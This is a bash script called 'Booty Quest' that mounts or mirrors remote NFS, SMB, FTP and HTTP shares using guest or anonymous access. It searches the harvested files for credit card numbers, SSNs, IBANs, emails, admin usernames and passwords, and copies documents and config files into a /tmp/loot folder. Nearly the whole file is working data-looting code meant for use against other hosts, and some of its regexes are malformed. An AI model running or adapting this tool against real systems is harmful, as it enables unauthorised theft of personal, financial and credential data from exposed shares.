#!/bin/bash

echo "###########################"
echo "# [B]ooty [Q]uest         #"
echo "# By Adam Espitia         #"
echo "# aahideaway.blogspot.com #"
echo "# Arr, matey,             #"
echo "#      where be me booty! #"
echo "###########################"
echo ""

LOC="/media/vulnshare/"
if [ ! -d $LOC ]; then
	mkdir $LOC
fi
DEST="/tmp/loot/"
if [ ! -d $DEST ]; then
	mkdir $DEST
fi
TYPE=$1
IP=$2
SHARE=$3
LOG="./bq_log.txt"
case $TYPE in
	nfs)
		echo "Mounting $IP:$SHARE to $LOC..."
		mount -o nolock $IP:$SHARE $LOC
		if [ ! "$(ls -A $LOC)" ]; then
			echo "Failed to mount //$IP$SHARE"
			exit 1
		fi
		;;
	smb)
		#This does not work like expected :/
		echo "Mounting //$IP$SHARE to $LOC..."
		mount -t cifs -o username=guest,password= //$IP$SHARE $LOC
		if [ ! "$(ls -A $LOC)" ]; then
			echo "Failed to mount //$IP$SHARE"
			exit 1
		fi
		;;
		
	ftp)
		echo "Downloading from $IP to $LOC..."
		wget -R "*.bin","*.mp3","*.iso","*.mov","*.avi","*.mpeg","*.zip","*.gz","*.7z","*.rar","*.tgz","*.exe","*.tar","*.css","*.wav","*.bz2","*.dll","*.msi" -X /program\ files/,/WINDOWS/,/proc/ -m --directory-prefix=$LOC ftp://anonymous:asd123@$IP
		if [ ! "$(ls -A $LOC)" ]; then
			echo "Failed to download from $IP"
			exit 1
		fi
		;;
	http)
		echo "Downloading from $IP to $LOC..."
		wget -R "*.bin","*.mp3","*.iso","*.mov","*.avi","*.mpeg","*.zip","*.gz","*.7z","*.rar","*.tgz","*.exe","*.tar","*.css","*.wav","*.bz2","*.dll","*.msi" -X /program\ files/,/WINDOWS/,/proc/ -m --directory-prefix=$LOC http://$IP$SHARE
		if [ ! "$(ls -A $LOC)" ]; then
			echo "Failed to download from $IP"
			exit 1
		fi
		;;
	local)
		LOC=$2
		echo "Searching dir $LOC..."
		;;
	*)
		echo "This script will mount/download content from a remote host and search it for sensitive information."
		echo ""
		echo "Usage here"
		echo "./bq.sh nfs 192.168.1.1 /share/here/"
		echo "./bq.sh smb 192.168.1.1 /share/here/"
		echo "./bq.sh ftp 192.168.1.1"
		echo "./bq.sh http 192.168.1.1 /dir/path/"
		echo "./bq.sh local /dir/path/"
		exit 1
		;;
esac

ctrlc(){
 echo "***stopping"
 read -r -p "Do you want to scan what we have so far?? (y/n) " REPLY
 echo  ""
 if [[ $REPLY =~ ^[Yy]$ ]]
 then
  echo "Ok cool here we go..."
 else
  echo "Ok later."
 fi
}
trap ctrlc SIGINT SIGTERM

echo "Looking for CCNs..." | tee -a $LOG
grep -I --color -H -r -n -E '^([0-9]{4}[- ]?){3}[0-9]{4}$' $LOC | tee -a $LOG


echo "Looking for SSNs..." | tee -a $LOG
grep -I --color -H -r -E "\b^(?!000)(0-6?\d{2}|7(0-6?\d|7012?))(-?)(?!00)\d\d\3(?!0000)\d{4}$\b" $LOC | tee -a $LOG

echo "Looking for Phone #s..." | tee -a $LOG
grep -I --color -H -r -n '\(([0-9\{3\})\|[0-9]\{3\}\)[-]\?[0-9]\{3\}[-]\?[0-9]\{4\}' $LOC | tee -a $LOG

echo "Looking for email addresses..." | tee -a $LOG
grep -I --color -H -r -n -E -o "\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z0-9]{2,6}\b" $LOC | tee -a $LOG

echo "Looking for IBAN..." | tee -a $LOG
grep -I --color -H -r -E '^((NO)[0-9A-Z]{2}[ ][0-9A-Z]{4}[ ][0-9A-Z]{4}[ ][0-9A-Z]{3}|(NO)[0-9A-Z]{15}|(BE)[0-9A-Z]{2}[ ][0-9A-Z]{4}[ ][0-9A-Z]{4}[ ][0-9A-Z]{4}|(BE)[0-9A-Z]{16}|(DK|FO|FI|GL|NL)[0-9A-Z]{2}[ ][0-9A-Z]{4}[ ][0-9A-Z]{4}[ ][0-9A-Z]{4}[ ][0-9A-Z]{2}|(DK|FO|FI|GL|NL)[0-9A-Z]{18}|(MK|SI)[0-9A-Z]{2}[ ][0-9A-Z]{4}[ ][0-9A-Z]{4}[ ][0-9A-Z]{4}[ ][0-9A-Z]{3}|(MK|SI)[0-9A-Z]{19}|(BA|EE|KZ|LT|LU|AT)[0-9A-Z]{2}[ ][0-9A-Z]{4}[ ][0-9A-Z]{4}[ ][0-9A-Z]{4}[ ][0-9A-Z]{4}|(BA|EE|KZ|LT|LU|AT)[0-9A-Z]{20}|(HR|LI|LV|CH)[0-9A-Z]{2}[ ][0-9A-Z]{4}[ ][0-9A-Z]{4}[ ][0-9A-Z]{4}[ ][0-9A-Z]{4}[ ][0-9A-Z]{1}|(HR|LI|LV|CH)[0-9A-Z]{21}|(BG|DE|IE|ME|RS|GB)[0-9A-Z]{2}[ ][0-9A-Z]{4}[ ][0-9A-Z]{4}[ ][0-9A-Z]{4}[ ][0-9A-Z]{4}[ ][0-9A-Z]{2}|(BG|DE|IE|ME|RS|GB)[0-9A-Z]{22}|(GI|IL)[0-9A-Z]{2}[ ][0-9A-Z]{4}[ ][0-9A-Z]{4}[ ][0-9A-Z]{4}[ ][0-9A-Z]{4}[ ][0-9A-Z]{3}|(GI|IL)[0-9A-Z]{23}|(AD|CZ|SA|RO|SK|ES|SE|TN)[0-9A-Z]{2}[ ][0-9A-Z]{4}[ ][0-9A-Z]{4}[ ][0-9A-Z]{4}[ ][0-9A-Z]{4}[ ][0-9A-Z]{4}|(AD|CZ|SA|RO|SK|ES|SE|TN)[0-9A-Z]{24}|(PT)[0-9A-Z]{2}[ ][0-9A-Z]{4}[ ][0-9A-Z]{4}[ ][0-9A-Z]{4}[ ][0-9A-Z]{4}[ ][0-9A-Z]{4}[ ][0-9A-Z]{1}|(PT)[0-9A-Z]{25}|(IS|TR)[0-9A-Z]{2}[ ][0-9A-Z]{4}[ ][0-9A-Z]{4}[ ][0-9A-Z]{4}[ ][0-9A-Z]{4}[ ][0-9A-Z]{4}[ ][0-9A-Z]{2}|(IS|TR)[0-9A-Z]{26}|(FR|GR|IT|MC|SM)[0-9A-Z]{2}[ ][0-9A-Z]{4}[ ][0-9A-Z]{4}[ ][0-9A-Z]{4}[ ][0-9A-Z]{4}[ ][0-9A-Z]{4}[ ][0-9A-Z]{3}|(FR|GR|IT|MC|SM)[0-9A-Z]{27}|(AL|CY|HU|LB|PL)[0-9A-Z]{2}[ ][0-9A-Z]{4}[ ][0-9A-Z]{4}[ ][0-9A-Z]{4}[ ][0-9A-Z]{4}[ ][0-9A-Z]{4}[ ][0-9A-Z]{4}|(AL|CY|HU|LB|PL)[0-9A-Z]{28}|(MU)[0-9A-Z]{2}[ ][0-9A-Z]{4}[ ][0-9A-Z]{4}[ ][0-9A-Z]{4}[ ][0-9A-Z]{4}[ ][0-9A-Z]{4}[ ][0-9A-Z]{4}[ ][0-9A-Z]{2}|(MU)[0-9A-Z]{30}|(MT)[0-9A-Z]{2}[ ][0-9A-Z]{4}[ ][0-9A-Z]{4}[ ][0-9A-Z]{4}[ ][0-9A-Z]{4}[ ][0-9A-Z]{4}[ ][0-9A-Z]{4}[ ][0-9A-Z]{3}|(MT)[0-9A-Z]{31})$' $LOC | tee -a $LOG

echo "Looking for IPs..." | tee -a $LOG
grep -I --color -H -r -E '(^|[[:space:]])[[:digit:]]{1,3}(\.[[:digit:]]{1,3}){3}([[:space:]]|$)' $LOC | tee -a $LOG

echo "Looking for admin and service account usernames..." | tee -a $LOG
grep -I --color -H -r -i "*adm*" $LOC | tee -a $LOG
grep -I --color -H -r -i "*loc*" $LOC | tee -a $LOG
grep -I --color -H -r -i "svc_*" $LOC | tee -a $LOG

echo "Looking for passwords..." | tee -a $LOG
grep -I --color -H -r -i -E '(P|p)(A|a)(S|s)(S|s)(W|w)(O|o)(R|r)(D|d)' $LOC | tee -a $LOG

echo "Looking for PDF/DOC/PPT/XLS/CSV/MSG/SH/CONFIG/CONF files and saving to $DEST..."
find $LOC -name "*.pdf" -exec cp {} $DEST \;
find $LOC -name "*.doc*" -exec cp {} $DEST \;
find $LOC -name "*.ppt*" -exec cp {} $DEST \;
find $LOC -name "*.xls*" -exec cp {} $DEST \;
find $LOC -name "*.csv" -exec cp {} $DEST \;
find $LOC -name "*.msg" -exec cp {} $DEST \;
find $LOC -name "*.sh" -exec cp {} $DEST \;
find $LOC -name "*.config" -exec cp {} $DEST \;
find $LOC -name "*.conf" -exec cp {} $DEST \;
[ "$(ls -A $DEST)" ] && echo "FILES FOUND and place in $DEST"
echo ""
if [ $TYPE = "nfs" -o $TYPE = "smb" ]; then
	read -p "Do you want to unmount $LOC? (y/n) " REPLY
	echo  ""
	if [[ $REPLY =~ ^[Yy]$ ]];
	then
    		umount $LOC
	fi
else
	#read -p "Do you want to remove everything downloaded to $LOC? (y/n)" REPLY
     	read -r -p "Do you want to remove everything downloaded to $LOC? (y/n) " REPLY
        echo  ""
        if [[ $REPLY =~ ^[Yy]$ ]]
        then
                rm -rf $LOC*
        fi
fi
